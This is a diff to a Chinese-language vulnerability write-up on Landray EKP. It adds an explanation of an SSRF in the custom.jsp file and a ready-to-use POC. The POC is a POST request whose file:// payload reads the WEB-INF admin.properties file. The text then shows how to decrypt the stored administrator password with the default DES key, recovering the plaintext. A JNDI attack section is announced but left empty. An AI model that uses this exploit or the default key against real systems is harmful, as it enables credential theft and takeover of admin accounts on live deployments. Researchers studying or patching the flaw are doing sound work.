@@ -18,6 +18,7 @@
 
 ## 已知漏洞
  - [1.custom.jsp文件读取漏洞](#custom文件读取)
+ - [2.admin.do jndi漏洞](#jndi攻击admin)
 
 ### custom文件读取
 custom.jsp文件内容如下
@@ -37,3 +38,36 @@ custom.jsp文件内容如下
 </c:import>
 <% }%>
 ```
+其中的两个jsp标签`<c:import>`和`<c:param>`。`<c:import>`用于请求本地或远程数据/文件，其中必须要传入url参数，url可以是相对路径和绝对路径。`<c:param>`用于指定url的参数
+
+也就是标签部分存在两个值，一个是url，另外一个是加参数后的url。如果传入的url和param如下，那么加参数后的url为`http://a.com?id=test`，会向这个url发起请求，造成SSRF。
+```
+<c:import url="http://a.com" > 
+<c:param name="id" value="test" /> 
+</c:import>
+```
+
+然后看一下poc，访问路径就是jsp文件在ekp文件夹下的绝对路径，POST的内容需要符合JSON格式，赋值给参数var。通过SSRF利用file协议来读取文件
+```
+POST /ekp/sys/ui/extend/varkind/custom.jsp
+Content-Type: application/x-www-form-urlencoded
+
+var={"body":{"file":"file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#"}}
+```
+这样poc经过jsp，url和url加上var参数的值分别如下。也这是为什么url后需要一个`#`来截断（Windows下），以正常读取url对应的文件，否则会报错file not found。
+```
+url=file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#
+
+urlWithParams=file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#?var={"body":{"file":"file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#"}}
+```
+读取admin.properties文件，内容如下，其中password是DES加密的
+```
+password = Ac6OXgTtn4AqNRCxWmSwhg==\r
+kmss.properties.encrypt.enabled = true
+```
+通过在线DES解密网站：http://tool.chacuo.net/cryptdes, 在密码处填入默认密钥`kmssAdminKey`，和待解密的文本`Ac6OXgTtn4AqNRCxWmSwhg==`，进行DES解密后得到
+```
+Password1
+```
+
+### jndi攻击admin
